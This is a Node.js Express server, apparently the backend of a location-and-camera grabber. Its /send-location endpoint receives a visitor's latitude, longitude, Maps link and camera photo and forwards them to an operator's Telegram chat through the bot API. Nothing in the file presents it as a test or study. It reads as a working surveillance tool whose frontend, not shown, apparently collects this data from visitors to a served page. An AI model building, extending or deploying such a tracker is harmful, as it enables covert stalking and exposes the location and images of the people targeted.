const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");
const multer = require("multer");
const FormData = require("form-data");

const app = express();

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const upload = multer({ storage: multer.memoryStorage() });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log("🚀 INICIANDO SERVIDOR");
console.log("📱 TELEGRAM_BOT_TOKEN:", TELEGRAM_BOT_TOKEN ? `${TELEGRAM_BOT_TOKEN.slice(0, 10)}...` : "❌ NÃO DEFINIDO");
console.log("💬 TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID : "❌ NÃO DEFINIDO");
console.log("⏰ Timestamp:", new Date().toISOString());
console.log("=".repeat(50));

app.post("/send-location", upload.single('photo'), async (req, res) => {
  console.log("\n🌍 === NOVA REQUISIÇÃO DE LOCALIZAÇÃO ===");
  console.log("⏰ Timestamp:", new Date().toISOString());
  console.log("📥 Body recebido:", JSON.stringify(req.body, null, 2));
  console.log("📷 Foto recebida:", req.file ? "SIM" : "NÃO");

  const { latitude, longitude, maps } = req.body;
  const photo = req.file;

  if (!latitude || !longitude) {
    console.log("❌ ERRO: Dados inválidos");
    return res.status(400).json({
      success: false,
      message: "Latitude e longitude são obrigatórias"
    });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("❌ ERRO: Variáveis de ambiente faltando");
    return res.status(500).json({
      success: false,
      message: "Configuração do servidor incompleta"
    });
  }

  try {
    // Envia a foto primeiro (se existir)
    if (photo) {
      console.log("📤 Enviando foto para o Telegram...");
      
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', photo.buffer, {
        filename: 'camera.jpg',
        contentType: 'image/jpeg'
      });
      
      const caption = `📸 Foto capturada
📍 Latitude: ${latitude}
📍 Longitude: ${longitude}
🗺️ Maps: ${maps}
⏰ ${new Date().toLocaleString('pt-BR')}`;
      
      formData.append('caption', caption);
      
      const photoResponse = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        formData,
        {
          headers: formData.getHeaders(),
          timeout: 30000
        }
      );
      
      console.log("✅ Foto enviada com sucesso!");
      console.log("   Response:", JSON.stringify(photoResponse.data, null, 2));
    }

    // Envia a mensagem de localização
    console.log("📤 Enviando localização para o Telegram...");
    
    const message = `🌍 Nova localização recebida!

📍 Coordenadas:
• Latitude: ${latitude}
• Longitude: ${longitude}

🗺️ Link do Maps:
${maps}

⏰ Data/Hora: ${new Date().toLocaleString('pt-BR')}`;

    const messageResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 10000,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );

    console.log("✅ Localização enviada com sucesso!");
    console.log("   Response:", JSON.stringify(messageResponse.data, null, 2));

    res.status(200).json({
      success: true,
      message: "Dados enviados com sucesso"
    });

  } catch (error) {
    console.log("🔥 ERRO AO ENVIAR PARA TELEGRAM:");
    console.log("   Tipo do erro:", error.constructor.name);
    console.log("   Mensagem:", error.message);
    
    if (error.response) {
      console.log("   Status HTTP:", error.response.status);
      console.log("   Data:", JSON.stringify(error.response.data, null, 2));
    } else if (error.request) {
      console.log("   Request feito mas sem resposta");
    }
    
    console.log("   Stack trace:", error.stack);

    res.status(500).json({
      success: false,
      message: "Erro ao enviar dados para o Telegram",
      error_details: {
        message: error.message,
        status: error.response?.status,
        data: error.response?.data
      }
    });
  }

  console.log("=== FIM DA REQUISIÇÃO ===\n");
});

app.get('/health', (req, res) => {
  console.log("💊 Health check requisitado");
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env_check: {
      bot_token: !!TELEGRAM_BOT_TOKEN,
      chat_id: !!TELEGRAM_CHAT_ID
    }
  });
});

if (process.env.NODE_ENV !== 'production') {
  app.listen(8088, () => {
    console.log("🖥️ Servidor local rodando na porta 8088");
  });
}

module.exports = app;